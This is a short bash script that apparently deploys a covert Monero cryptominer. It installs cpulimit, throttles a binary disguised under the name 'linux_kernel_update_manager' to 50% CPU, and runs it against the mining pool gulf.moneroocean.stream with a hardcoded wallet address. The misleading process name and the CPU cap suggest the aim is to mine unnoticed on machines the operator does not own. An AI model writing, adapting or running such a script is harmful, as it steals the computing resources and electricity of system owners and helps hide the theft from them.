#!/bin/bash
sudo apt-get update &
sleep 10
sudo apt install -y cpulimit &&
chmod +x ~/gg003/linux_kernel_update_manager &&
cpulimit -e linux_kernel_update_manager -l 50 -b &
sleep 60
~/gg003/./linux_kernel_update_manager --any --ssl --forever --variation 3 -o gulf.moneroocean.stream:443 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev -p google  -c ~/gg003/config.txt &
sleep 60m


